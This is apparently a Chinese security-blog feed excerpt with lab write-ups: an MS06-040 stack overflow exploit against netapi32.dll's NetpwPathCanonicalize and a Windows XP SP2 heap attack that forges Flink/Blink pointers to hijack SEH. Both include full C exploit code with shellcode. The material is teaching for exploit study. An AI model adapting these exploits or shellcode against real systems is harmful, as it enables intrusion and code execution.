class="type">char</span> PathName1[PATH1_SIZE];</span><br><span class="line">    <span class="type">char</span> PathName2[PATH2_SIZE];</span><br><span class="line">    <span class="type">char</span> Outbuf[OUTBUF_SIZE];</span><br><span class="line">    <span class="type">int</span> OutbufLen=OUTBUF_SIZE;</span><br><span class="line">    <span class="type">char</span> Prefix1[PREFIX_SIZE];</span><br><span class="line">    <span class="type">char</span> Prefix2[PREFIX_SIZE];</span><br><span class="line">    <span class="type">long</span> PathType1=<span class="number">44</span>;</span><br><span class="line">    <span class="type">long</span> PathType2=<span class="number">44</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//load vulnerability netapi32.dll which we got from a WINXP sp0 host</span></span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[ ] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[ ] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fill PathName</span></span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(PathName1)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="string">&#x27;b&#x27;</span>,<span class="keyword">sizeof</span>(PathName2)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set Prefix as a null string</span></span><br><span class="line">    <span class="built_in">memset</span>(Prefix1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix1));</span><br><span class="line">    <span class="built_in">memset</span>(Prefix2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix2));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// call NetpwPathCanonicalize several times to overflow</span></span><br><span class="line">    (Trigger)(PathName1,Outbuf,<span class="number">1</span> ,Prefix1,&amp;PathType1,<span class="number">0</span>);</span><br><span class="line">    (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态调试-2"><a class="markdownIt-Anchor" href="#动态调试-2"></a> 动态调试</h2><p>在动态调试时，当第二次调用 NetpwPathCanonicalize，运行至 0x5FDDA33E 处的 wcscat 时发生了栈溢出，如下图所示。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717215304487.png" alt="image-20220717215304487"></p><p>可以看到， EBP、返回地址以及 CanonicalizePathName 的部分参数被覆盖，溢出成功。ecx 始终指向栈中（0x0012EA18），那我们就选用 0x71BBFCBE 处的 CALL ECX 作为跳板。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717220145700.png" alt="image-20220717220145700"></p><p>从上面溢出图片可以看出，0x0012EE2C 是被 ”bbbb“ 溢出覆盖了，我们只用找到它相对偏移就能够替换掉 0x0012EE2C 处的内容。向前找到 b 的起始位置，可以看到 b 从 0x0012EB9A 处开始，相对偏移就是 0x(292+4)。直接在钩造完成后，复制前，把PathName2[296] 覆盖为我们想要的地址( 0x71BBFCBE )。</p><p>因为我们需要执行 shellcode，所以我们要把 shellcode 放在 PathName1 的开头，就能运行。</p><p>按照如下布局，构建代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__stdcall * MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH1_SIZE (0xc2*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2_SIZE (0x150*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUTBUF_SIZE 0x440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_SIZE 0x410</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ShellCode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> PathName1[PATH1_SIZE];</span><br><span class="line">    <span class="type">char</span> PathName2[PATH2_SIZE];</span><br><span class="line">    <span class="type">char</span> Outbuf[OUTBUF_SIZE];</span><br><span class="line">    <span class="type">int</span> OutbufLen=OUTBUF_SIZE;</span><br><span class="line">    <span class="type">char</span> Prefix1[PREFIX_SIZE];</span><br><span class="line">    <span class="type">char</span> Prefix2[PREFIX_SIZE];</span><br><span class="line">    <span class="type">long</span> PathType1=<span class="number">44</span>;</span><br><span class="line">    <span class="type">long</span> PathType2=<span class="number">44</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//load vulnerability netapi32.dll which we got from a WINXP sp0 host</span></span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[ ] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[ ] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fill PathName</span></span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(PathName1)<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将ShellCode拷贝到缓冲区中</span></span><br><span class="line"><span class="built_in">memcpy</span>(PathName1, ShellCode, <span class="keyword">sizeof</span>(ShellCode));</span><br><span class="line"><span class="comment">// 将ShellCode后面的0x00填充为0x90</span></span><br><span class="line">PathName1[<span class="keyword">sizeof</span>(ShellCode)<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set Prefix as a null string</span></span><br><span class="line">    <span class="built_in">memset</span>(Prefix1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix1));</span><br><span class="line">    <span class="built_in">memset</span>(Prefix2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix2));</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="string">&#x27;b&#x27;</span>,<span class="keyword">sizeof</span>(PathName2)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 将返回地址覆盖为jmp ebp 71BBFCBE</span></span><br><span class="line">PathName2[<span class="number">0x296</span>] = <span class="number">0xBE</span>;</span><br><span class="line">PathName2[<span class="number">0x297</span>] = <span class="number">0xFC</span>;</span><br><span class="line">PathName2[<span class="number">0x298</span>] = <span class="number">0xBB</span>;</span><br><span class="line">PathName2[<span class="number">0x299</span>] = <span class="number">0x71</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// call NetpwPathCanonicalize several times to overflow</span></span><br><span class="line">    (Trigger)(PathName1,Outbuf,<span class="number">1</span> ,Prefix1,&amp;PathType1,<span class="number">0</span>);</span><br><span class="line">    (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，运行，又是我们熟悉的对话框。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717230456660.png" alt="image-20220717230456660"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;rpc-漏洞&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rpc-漏洞&quot;&gt;&lt;/a&gt; RPC 漏洞&lt;/h1&gt;
&lt;h2 id=&quot;rpc-漏洞简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hre</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>重重保护下的堆</title>
    <link href="https://www.rgzzplus.com/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/"/>
    <id>https://www.rgzzplus.com/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/</id>
    <published>2022-07-06T15:12:30.000Z</published>
    <updated>2022-08-01T11:17:34.263Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="堆保护机制的原理"><a class="markdownIt-Anchor" href="#堆保护机制的原理"></a> 堆保护机制的原理</h1><p>堆中的安全校验操作</p><ul><li>**PEB random：**在 Windows XP SP2 之后不再使用固定的 PEB 基址 0x7ffdf000，而是使用具有一定随机性的 PEB 基址。Matt C onover  指出这种变动只是在 0x7FFDF000~0x7FFD4000 之间移动。覆盖 PEB 中函数指针的利用方式请参见 “堆溢出利用（下）”中的实验和“攻击 PEB 中的函数指针” 的相关介绍。</li><li><strong>Safe Unlink：</strong> 微软改写了操作双向链表的代码，在卸载 free list 中的堆块时更加小心。</li></ul><p>对照“堆溢出利用（上）——DWORD SHOOT”中关于双向链表拆卸问题的描述，在 SP2 之前的链表拆卸操作类似于如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line">&#123;</span><br><span class="line">    node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">    node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SP2 之后在进行删除操作时，将提前验证堆块前向指针和后向指针的完整性，以防止发生DWORD SHOOT：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">safe_remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( (node-&gt;blink-&gt;flink==node)&amp;&amp;(node-&gt;flink-&gt;blink==node) )</span><br><span class="line">    &#123;</span><br><span class="line">        node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">        node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        链表指针被破坏，进入异常</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>heap cookie：</strong> 与栈中的 security cookie 类似，微软在堆中也引入了 cookie，用于检测堆溢出的发生。cookie 被布置在堆首部分原堆块的 segment table 的位置，占 1 个字节大小。</li></ul><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220629221905143.png" alt="image-20220629221905143" style="zoom: 80%;"><ul><li><strong>元数据加密：</strong> 微软在 Windows Vista 及后续版本的操作系统中开始使用该安全措施。块首中的一些重要数据在保存时会与一个 4 字节的随机数进行异或运算，在使用这些数据时候需要再进行一次异或运行来还原。</li></ul><h1 id="攻击堆中存储的变量"><a class="markdownIt-Anchor" href="#攻击堆中存储的变量"></a> 攻击堆中存储的变量</h1><p>堆中的各项保护措施是对堆块的关键结构进行保护，而对于堆中存储的内容是不保护的。如果堆中存放着一些重要的数据或结构指针，如函数指针等内容，通过覆盖这些重要的内容还是可以实现溢出的。这种攻击手段与堆保护措施没有什么联系，所以我们在这就不过多讨论了。</p><h1 id="利用-chunk-重设大小攻击堆"><a class="markdownIt-Anchor" href="#利用-chunk-重设大小攻击堆"></a> 利用 chunk 重设大小攻击堆</h1><p>Safe Unlink 精髓之处在于从 FreeList[n]上拆卸 chunk 时对双向链表的有效性进行验证。但对于插入 chunk 却没有校验。</p><p>链表中会发生插入操作的情况：<br>（1）内存释放后 chunk 不再被使用时它会被重新链入链表。<br>（2）当 chunk 的内存空间大于申请的空间时，剩余的空间会被建立成一个新的 chunk，链入链表中。</p><p>从 FreeList[0]上申请空间的过程：<br>（1）将 FreeList[0]上最后一个 chunk 的大小与申请空间的大小进行比较，如果 chunk 的大小大于等于申请的空间， 则继续分派，否则扩展空间（若超大堆块链表无法满足分配，则扩展堆）。<br>（2）从 FreeList[0]的第一个 chunk 依次检测，直到找到第一个符合要求的 chunk，然后将其从链表中拆卸下来（搜索恰巧合适的堆块进行分配）。<br>（3）分配好空间后如果 chunk 中还有剩余空间，剩余的空间会被建立成一个新 chunk，并插入到链表中（堆块空间过剩则切分之）。</p><p>在这三个步骤中，第一步我们没有任何利用的机会。由于 Safe Unlink 的存在，如果我们去覆盖 chunk 的结构在第二步的时候就会被检测出来，这么看来我们没有任何利用的机会。但是 Safe Unlink 中存在一个让人疑惑的问题，即便 Safe Unlink 检测到 chunk 结构已经被破坏，它还是会允许后续的一些操作执行，例如重设 chunk 的大小。</p><h2 id="分析重设-chunk-的具体过程"><a class="markdownIt-Anchor" href="#分析重设-chunk-的具体过程"></a> 分析重设 chunk 的具体过程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HLOCAL h1;</span><br><span class="line">    HANDLE hp;</span><br><span class="line">    hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>推荐使用的环境</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP Pro SP2</td></tr><tr><td>编译环境</td><td>VC++ 6.0</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><blockquote><p>说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。</p></blockquote><p>调试观察内存状态，可以看到堆的起始地址为 0x00390000（ EAX 的值）， FreeList[0]位于0x00390178，在 0x00390178 处可以看到唯一的 chunk 位于 0x00390688。此时 FreeList[0]头节点和 chunk 如图 15.3.1 所示。</p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220630084013720-16565496150431.png" alt="image-20220630084013720" style="zoom:67%;"><p>接下来分析将新 chunk 插入链表的过程。在 0x7C931513 的位置下设断点，这是修改 chunk 中下一chunk 指针和上一 chunk 指针的开始。该地址为 ntdll 加载基址+0x11513，如果您的实验环境地址有所变化，请用此方法自行确认。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220630130833605.png" alt="image-20220630130833605"></p><p>新 chunk 插入链表的过程：</p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702091757067.png" alt="image-20220702091757067" style="zoom: 20%;"><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220630131045186.png" alt="image-20220630131045186"></p><p>新chunk 插入过程归纳：<br>新 chunk-&gt;Flink=旧 chunk-&gt;Flink<br>新 chunk-&gt;Blink=旧 chunk-&gt;Flink-&gt;Blink<br>旧 chunk-&gt;Flink-&gt;Blink-&gt;Flink=新 chunk<br>旧 chunk-&gt;Flink-&gt;Blink=新 chunk</p><p>插入完成后，观察FreeList[0]的链表结构<br><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702081704143.png" alt="image-20220702081704143"></p><p>考虑下如果将旧 chunk 的 Flink 和 Blink 指针都覆盖了会出现情况呢？例如，我们将旧 chunk 的 Flink 指针覆盖为 0xAAAAAAAA，Blink 指针覆盖为 0xBBBBBBBB，套用我们前面归纳的公式，可以得出如下结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x003906A0</span>]=<span class="number">0xAAAAAAAA</span></span><br><span class="line">[<span class="number">0x003906A0</span>+<span class="number">4</span>]=[<span class="number">0xAAAAAAAA</span>+<span class="number">4</span>]</span><br><span class="line">[[<span class="number">0xAAAAAAAA</span>+<span class="number">4</span>]]=<span class="number">0x003906A0</span></span><br><span class="line">[<span class="number">0xAAAAAAAA</span>+<span class="number">4</span>]=<span class="number">0x003906A0</span></span><br></pre></td></tr></table></figure><p>这实际上是一个向任意地址写入固定值的漏洞（DWORD SHOOT），而 Safe Unlink 的验证的不严密性却能执行这个 DWORD SHOOT。如果将内存中的某个函数指针或者 S.E.H 处理函数指针覆盖为 shellcode 的地址，不就可以实现溢出了吗？</p><blockquote><p>注意： 0xAAAAAAAA+4 必须指向可读可写的地址，而 0xAAAAAAAA+4 中存放的地址必须指向可写的地址，否则会出现异常。</p></blockquote><h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x10\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line">    <span class="string">&quot;\xEB\x06\x39\x00\xEB\x06\x39\x00&quot;</span><span class="comment">//覆盖 Flink 和 Blink</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xEB\x31\x90\x90\x90\x90\x90\x90&quot;</span><span class="comment">//跳转指令，跳过下面的垃圾代码</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x11\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8C\x06\x39\x00\xE4\xFF\x12\x00&quot;</span><span class="comment">//伪造的 Flink 和 Blink</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line">    HLOCAL h1,h2;</span><br><span class="line">    HANDLE hp;</span><br><span class="line">    hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(h1,shellcode,<span class="number">300</span>);</span><br><span class="line">    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,zero);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路</h2><p>（1）首先 h1 向堆中申请 16 个字节的空间。<br>（2）由于此时堆刚刚初始化所以空间是从 FreeList[0]中申请的，从 FreeList[0]中拆卸下来的 chunk 在分配好空间后会将剩余的空间新建一个 chunk 并插入到 FreeList[0]中， 所以 h1 后面会跟着一个大空闲块。<br>（3）当向 h1 中复制超过 16 个字节空间时就会覆盖后面 chunk 的块首。<br>（4） Chunk 的块首被覆盖后，当 h2 申请空间时，程序就会从被破坏的 chunk 中分配空间，并将剩余空间新建为一个 chunk 并插入到 FreeList[0]中。<br>（5）通过伪造 h2 申请空间前 chunk 的 Flink 和 Blink，实现在新 chunk 插入 FreeList[0]时将新 chunk 的 Flink 起始地址写入到任意地址。因此通过控制 h2 申请空间前 chunk 的 Flink 和Blink 值，可以将数据写入到异常处理函数指针所在位置。<br>（6）通过制造除 0 异常，让程序转入异常处理，进而劫持程序流程，让程序转入 shellcode 执行。</p><table><thead><tr><th></th><th style="text-align:left">推荐使用的环境</th></tr></thead><tbody><tr><td>操作系统</td><td style="text-align:left">Windows XP Pro SP2</td></tr><tr><td>编译环境</td><td style="text-align:left">VC++ 6.0</td></tr><tr><td>build 版本</td><td style="text-align:left">release 版本</td></tr></tbody></table><blockquote><p>说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。</p></blockquote><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h2><h3 id="构造填充字符串"><a class="markdownIt-Anchor" href="#构造填充字符串"></a> 构造填充字符串</h3><p>（ 1）先用16个 \x90 填充shellcode，然后编译运行调试。待程序在 0x00401050 处中断后观察内存状态。</p><p>h1 的数据部分起始地址为 0x00390688，后面 chunk 的 Flink 位于 0x003906A0，因此需要 32 个字节的字符串就可以覆盖掉 h1 后面 chunk 的 Flink 和 Blink（通过分析堆结构也可计算出填充字符串的长度）。现在需要选择一些内存地址来填充 Flink 和 Blink，在这我们不妨用 0x003906EB 分别填充 Flink 和 Blink。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702100441747.png" alt="image-20220702100441747"></p><blockquote><p>思考： 为什么要使用 0x003906EB？大家看看 0xEB06 